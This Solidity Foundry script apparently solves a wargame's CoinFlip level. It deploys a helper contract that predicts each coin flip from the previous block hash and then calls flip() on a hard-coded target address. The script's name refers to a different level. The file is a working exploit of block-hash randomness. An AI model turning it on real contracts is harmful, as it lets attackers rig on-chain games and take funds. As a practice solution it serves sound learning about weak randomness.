// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";

contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _instance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _instance.flip(side);
    }
}

contract Level2FallbackSolution is Script {
    CoinFlip public instance = CoinFlip(0xacc3595170921C9e4fA6c8Ce95e11Ee787Cd4bbE);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(instance);
        console.log("consecutiveWins: %d", instance.consecutiveWins());
        vm.stopBroadcast();
    }
}
